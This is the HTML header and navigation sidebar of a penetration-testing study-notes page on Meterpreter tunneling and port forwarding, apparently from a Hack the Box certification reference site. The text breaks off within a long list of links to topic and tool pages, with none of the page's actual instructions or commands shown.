

<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Meterpreter Tunneling and Port Forwarding &mdash; Celestial Security Reference R1 documentation</title>
      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/dark.css?v=70edf1c7" />

  
      <script src="../../_static/jquery.js?v=5d32c60e"></script>
      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script src="../../_static/documentation_options.js?v=3b1ff954"></script>
      <script src="../../_static/doctools.js?v=9bcbadda"></script>
      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
      <script src="../../_static/dark_mode_js/default_dark.js?v=fd565c74"></script>
      <script src="../../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
    <script src="../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Socat Redirection with a Reverse Shell" href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html" />
    <link rel="prev" title="Remote-Reverse Port Forwarding with SSH" href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html" />
    <link href="../../_static/custom.css" rel="stylesheet" type="text/css">

</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../../index.html" class="icon icon-home">
            Celestial Security Reference
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Hack the Box Certifications</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Certified%20Penetration%20Tester.html">Certified Penetration Tester</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../CDSA/Certified%20Defensive%20Security%20Analyst.html">Certified Defensive Security Analyst</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Offensive Methods</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../OFSEC/recon/Active%20Scanning.html">Active Scanning</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Overview</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Overview/Introduction%20to%20Active%20Directory.html">Introduction to Active Directory</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Overview/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Overview/Types%20of%20Penetration%20testing.html">Types of Penetration testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Overview/Vulnerability%20Assessment.html">Vulnerability Assessment</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Footprinting.html">Footprinting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#domain-information">Domain information</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#cloud-resource-enumeration">Cloud Resource Enumeration</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#online-tools-to-gather-information-about-a-domain">Online Tools to gather information about a domain</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#staff">Staff</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Host%20Enumeration.html">Host Based Enumeration</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/fingerprinting.html">fingerprinting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Initial%20Enumeration%20of%20a%20AD%20Domain.html">Initial Enumeration of a AD Domain</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/External%20Recon%20and%20Enumeration%20Principles.html">External Recon and Enumeration Principles</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Information%20Gathering.html">Information Gathering</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Initial Access</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="File%20Inclusion.html">File Inclusion</a></li>
<li class="toctree-l1"><a class="reference internal" href="SSH%20Forwarding.html">SSH Forwarding</a></li>
<li class="toctree-l1"><a class="reference internal" href="Dynamic%20Port%20Forwarding%20with%20SSH%20and%20SOCKS%20Tunneling.html">Dynamic Port Forwarding with SSH and SOCKS Tunneling</a></li>
<li class="toctree-l1"><a class="reference internal" href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html">Remote-Reverse Port Forwarding with SSH</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Meterpreter Tunneling and Port Forwarding</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#description">Description</a></li>
<li class="toctree-l2"><a class="reference internal" href="#creating-a-shell-on-the-pivot-host">Creating a shell on the pivot host</a></li>
<li class="toctree-l2"><a class="reference internal" href="#configuring-msf-s-socks-proxy">Configuring MSF’s SOCKS Proxy</a></li>
<li class="toctree-l2"><a class="reference internal" href="#listing-active-routes-with-autoroute">Listing active routes with Autoroute</a></li>
<li class="toctree-l2"><a class="reference internal" href="#testing-the-proxychain-config">Testing the proxychain config</a></li>
<li class="toctree-l2"><a class="reference internal" href="#port-forwarding-with-msf">Port Forwarding with MSF</a></li>
<li class="toctree-l2"><a class="reference internal" href="#meterpreter-reverse-port-forwarding">Meterpreter Reverse Port Forwarding</a></li>
<li class="toctree-l2"><a class="reference internal" href="#generating-the-windows-payload">Generating the Windows payload</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html">Socat Redirection with a Reverse Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Bind%20Shell.html">Socat Redirection with a Bind Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="SSH%20for%20Windows%3A%20plink.exe.html">SSH for Windows: plink.exe</a></li>
<li class="toctree-l1"><a class="reference internal" href="SSH%20Pivoting%20with%20Sshuttle.html">SSH Pivoting with Sshuttle</a></li>
<li class="toctree-l1"><a class="reference internal" href="Web%20Server%20Pivoting%20with%20Rpivot.html">Web Server Pivoting with Rpivot</a></li>
<li class="toctree-l1"><a class="reference internal" href="Port%20Forwarding%20with%20Windows%20Netsh.html">Port Forwarding with Windows Netsh</a></li>
<li class="toctree-l1"><a class="reference internal" href="DNS%20Tunneling%20with%20Dnscat2.html">DNS Tunneling with Dnscat2</a></li>
<li class="toctree-l1"><a class="reference internal" href="SOCKS5%20Tunneling%20with%20Chisel.html">SOCKS5 Tunneling with Chisel</a></li>
<li class="toctree-l1"><a class="reference internal" href="ICMP%20Tunneling%20with%20SOCKS.html">ICMP Tunneling with SOCKS</a></li>
<li class="toctree-l1"><a class="reference internal" href="RDP%20and%20SOCKS%20Tunneling%20with%20SocksOverRDP.html">RDP and SOCKS Tunneling with SocksOverRDP</a></li>
<li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Linux.html">LLMNR/NBT-NS Poisoning - from Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Windows.html">LLMNR-NBT-NS Poisoning - from Windows</a></li>
<li class="toctree-l1"><a class="reference internal" href="Password%20Attacks.html">Password Attacks</a></li>
<li class="toctree-l1"><a class="reference internal" href="Remote%20Password%20Attacks.html">Remote Password Attacks</a></li>
<li class="toctree-l1"><a class="reference internal" href="Using%20the%20Metasploit%20Framework.html">Using the Metasploit Framework</a></li>
<li class="toctree-l1"><a class="reference internal" href="Shells%20and%20Payloads.html">Shells and Payloads</a></li>
<li class="toctree-l1"><a class="reference internal" href="Attacking%20Common%20Services.html">Attacking Common Services</a></li>
<li class="toctree-l1"><a class="reference internal" href="Active%20Directory%20Enumeration%20Attacks.html">Active Directory Enumeration Attacks</a></li>
<li class="toctree-l1"><a class="reference internal" href="Password%20Spraying.html">Password Spraying</a></li>
<li class="toctree-l1"><a class="reference internal" href="Enumerating%20and%20Retrieving%20Password%20Policies.html">Enumerating and Retrieving Password Policies</a></li>
<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Linux.html">Internal Password Spraying from Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Windows.html">Internal Password Spraying from Windows</a></li>
<li class="toctree-l1"><a class="reference internal" href="Enumerating%20Security%20Controls.html">Enumerating Security Controls</a></li>
<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Linux.html">Credentialed Enumeration - from Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Windows.html">Credentialed Enumeration - from Windows</a></li>
<li class="toctree-l1"><a class="reference internal" href="Living%20Off%20the%20Land.html">Living Off the Land</a></li>
<li class="toctree-l1"><a class="reference internal" href="Kerberoasting%20-%20from%20Linux.html">Kerberoasting - from Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="Kerberoasting%20-%20from%20Windows.html">Kerberoasting - from Windows</a></li>
<li class="toctree-l1"><a class="reference internal" href="Access%20Control%20List%20%28ACL%29%20Abuse%20Primer.html">Access Control List (ACL) Abuse Primer</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Lateral Movement</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/File%20Transfers.html">File Transfers</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Changing%20the%20user-agent%20to%20avoid%20detection.html">Changing the user-agent to avoid detection</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Native%20File%20Transfer%20Powershell.html">Native File Transfer Powershell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Creating%20a%20secure%20upload%20server%20using%20Nginx.html">Creating a secure upload server using Nginx</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Hunting%20for%20Files.html">Hunting for Files</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Linux%20Pass%20the%20Ticket.html">Linux Pass the Ticket</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Pivoting-Tunneling%20and%20Port%20Forwarding.html">Pivoting-Tunneling and Port Forwarding</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Glossary</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory.html">Active Directory</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory%20Explorer.html">Active Directory Explorer</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html">ADRecon</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html#description">Description</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html#references">References</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/adidnsdump.html">adidnsdump</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/apache%20nutch.html">apache nutch</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Application%20Testing.html">Application Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20AD%20and%20NTDS.dit.html">Attacking AD and NTDS.dit</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20LSASS.html">Attacking LSASS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20the%20SAM.html">Attacking the SAM</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Base64.html">Base64</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Bash.html">Bash</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/bettercap.html">bettercap</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Bitlocker.html">Bitlocker</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Black%20box%20Testing.html">Black box Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.html">bloodhound</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.py.html">bloodhound.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/builtwith.html">builtwith</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/burp%20suite.html">burp suite</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Certificates.html">Certificates</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/cewl.html">cewl</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/chisel.html">chisel</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html">Compliance Standards</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html#references">References</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/crackmapexec.html">crackmapexec</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/crawling.html">crawling</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/crowbar.html">crowbar</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/crunch.html">crunch</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/cupp.html">cupp</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/CVE-2021-1675.py.html">CVE-2021-1675.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/CVSS.html">CVSS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/d3ad0ne.html">d3ad0ne</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/DKIM.html">DKIM</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/domainPasswordSpray.html">domainPasswordSpray</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/DMARC.html">DMARC</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/DNS.html">DNS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsenum.html">dnsenum</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsrecon.html">dnsrecon</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsx.html">dnsx</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/dsquery.html">dsquery</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ettercap.html">ettercap</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/enum4linux-ng.html">enum4linux-ng</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Evasive%20testing.html">Evasive Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/evil-winrm.html">evil-winrm</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/extent.html">extent</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/GetNPUsers.py.html">GetNPUsers.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/fail2ban.html">fail2ban</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ffuf.html">ffuf</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/fierce.html">fierce</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20on%20Linux.html">File Encryption on Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20Windows.html">File Encryption Windows</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/finalRecon.html">finalRecon</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Firefox%20Decrypt.html">Firefox Decrypt</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/FTP.html">FTP</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/gettgtpkinit.py.html">gettgtpkinit.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/getnthash.py.html">getnthash.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/getuserspns.py.html">getuserspns.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/git.html">git</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/gobuster.html">gobuster</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/gpp-decrypt.html">gpp-decrypt</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Grey%20Box%20Testing.html">Grey Box Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Group3r.html">Group3r</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/hashcat.html">hashcat</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/hippa.html">hippa</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Hybrid%20evasive.html">Hybrid evasive</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/hydra.html">hydra</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/IMAP-POP3.html">IMAP-POP3</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/impacket.html">impacket</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/IPMP.html">IPMP</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/iso-27001.html">iso-27001</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/inveigh.html">inveigh</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/invoke-TheHash.html">Invoke-TheHash</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/john.html">john</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/keytab.html">keytab</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/keytabextract.py.html">keytabextract.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/kerberoast.html">kerberoast</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/kwprocessor.html">kwprocessor</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ldapsearch.html">ldapsearch</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/lazagne.html">lazagne</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/laps.html">laps</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/LAPSToolkit.html">LAPSToolkit</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/linkatz.html">Linikatz</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Linux%20local%20password%20attacks.html">Linux local password attacks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Linux%20Mount.html">Linux Mount</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/lookupsid.py.html">lookupsid.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/kerbrute.html">kerbrute</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/md5sum.html">md5sum</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/metasploit.html">metasploit</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/medusa.html">medusa</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Microsoft%20DREAD.html">Microsoft DREAD</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/mimikatz.html">mimikatz</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/mitm6.html">mitm6</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/msfvenom.html">msfvenom</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/MSSQL.html">MSSQL</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/MySQL.html">MySQL</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/mssqlclient.py.html">mssqlclient.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/nessus.html">nessus</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/netcat.html">netcat</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/netcraft.html">netcraft</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/net-webclient.html">net-webclient</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Network%20Testing.html">Network Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/NIST.html">NIST</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/NFS.html">NFS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/nikto.html">nikto</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/nmap.html">nmap</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/nopac.py.html">nopac.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html">netstat</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html#usage">Usage</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Non-evasive%20testing.html">Non-evasive testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/O365spray.html">O365spray</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/openssl.html">openssl</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Oracle%20TNS.html">Oracle TNS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/OSINT%20Framework.html">OSINT Framework</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/OSSTMM.html">OSSTMM</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/OWASP.html">OWASP</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/owasp-zap.html">owasp-zap</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/pentest.html">pentest</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/petitpotam.py.html">petitpotam.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/pci-dss.html">pci-dss</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Physical%20Testing.html">Physical Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/PingCastle.html">PingCastle</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/powershell.html">powershell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/powerview.html">powerview</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/PowerShell%20Web%20Uploads.html">PowerShell Web Uploads</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/princeprocessor.html">princeprocessor</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/proxychains.html">proxychains</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/psexec.html">psexec</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/psexec.py.html">psexec.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/PTES.html">PTES</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/pyenv.html">pyenv</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/raiseChild.py.html">raiseChild.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/r-services.html">r-services</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rdp.html">rdp</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/recon-ng.html">recon-ng</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/reconSpider.html">reconSpider</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/responder.html">responder</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rid.html">rid</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rpc.html">rpc</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rsync.html">rsync</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rpcclient.html">rpcclient</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rpcinfo.html">rpcinfo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rcpdump.py.html">rcpdump.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/rubeus.html">rubeus</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/S3%20Buckets.html">S3 Buckets</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/shadow%20credentials%20abusing.html">shadow credentials abusing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sharpHound.html">sharpHound</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sharpview.html">sharpview</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/smb.html">smb</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/smbserver.py.html">smbserver.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/scrappy.html">scrappy</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html">sc.exe</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html#description">Description</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html#usage">Usage</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/secretsdump.py.html">secretsdump.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/setspn.exe.html">setspn.exe</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/shells.html">shells</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sid.html">sid</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/smbmap.html">smbmap</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/SMTP.html">SMTP</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html">smtp-user-enum</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#installation">Installation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#usage">Usage</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#references">References</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/SNMP.html">SNMP</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Injection.html">SQL Injection</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/snaffler.html">snaffler</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Social%20Engineering%20Testing.html">Social Engineering Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ssh.html">ssh</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/spf.html">spf</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/spiderfoot.html">spiderfoot</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Injection%20Types.html">SQL Injection Types</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Load%20file.html">SQL Load file</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sqlcmd.html">sqlcmd</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sqsh.html">sqsh</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/subbrute.html">subbrute</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/sudo.html">sudo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/subfinder.html">subfinder</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Subverting%20SQL%20Query%20Logic.html">Subverting SQL Query Logic</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Symmetrical%20Encryption.html">Symmetrical Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/targetedKerberoast.py.html">targetedKerberoast.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/theharvester.html">theharvester</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ticketer.py.html">ticketer.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Transfer%20with%20Code.html">Transfer with Code</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Transferring%20File%20with%20GfxDownloadWrapper.exe.html">Transferring File with GfxDownloadWrapper.exe</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/tscon.exe.html">tscon.exe</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/ufw.html">ufw</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Python%20Uploadserver.html">Python Uploadserver</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20Bitsadmin%20to%20send%20and%20receive%20files.html">Using Bitsadmin to send and receive files</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20Certutil%20to%20download.html">Using Certutil to download</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Using%20OpenSSL%20to%20send%20and%20receive%20files.html">Using OpenSSL to send and receive files</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Understanding%20User%20Privileges.html">Understanding User Privileges</a></li>
